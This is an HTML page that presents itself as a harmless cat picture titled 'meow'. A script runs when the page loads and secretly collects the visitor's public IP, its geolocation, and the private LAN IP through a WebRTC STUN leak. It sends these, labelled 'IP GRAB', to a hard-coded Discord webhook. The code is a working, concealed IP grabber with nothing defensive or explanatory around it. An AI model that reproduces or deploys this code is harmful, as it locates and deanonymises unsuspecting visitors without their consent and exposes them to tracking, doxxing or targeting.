<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>meow</title>
  <style>
    body { background:#000; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; }
    img { max-width:90%; border-radius:10px; }
  </style>
</head>
<body>
  <img src="https://cataas.com/cat" alt="cat">
  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ";
    async function send() {
      let pub="unknown", priv="unknown", geo="unknown";
      try { const r=await fetch("https://api.ipify.org?format=json"); pub=(await r.json()).ip; } catch(e){}
      try { const r=await fetch("https://ipwho.is/"+pub); const d=await r.json(); if(d.success) geo=d.city+", "+d.region+", "+d.country; } catch(e){}
      try {
        const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
        pc.createDataChannel("x");
        await new Promise(r=>{pc.onicecandidate=e=>{if(e.candidate){const m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);if(m)priv=m[1];r();}}});
        await pc.setLocalDescription(await pc.createOffer());
        await new Promise(r=>setTimeout(r,1200));
      } catch(e){}
      const payload=JSON.stringify({content:`IP GRAB\npublic: ${pub}\nprivate: ${priv}\ngeolocation: ${geo}`});
      try { const blob=new Blob([payload],{type:"application/json"}); navigator.sendBeacon(WEBHOOK,blob); } catch(e){}
      try { await fetch(WEBHOOK,{method:"POST",mode:"no-cors",body:new Blob([payload],{type:"application/json"})}); } catch(e){}
    }
    window.onload=send;
  </script>
</body>
</html>
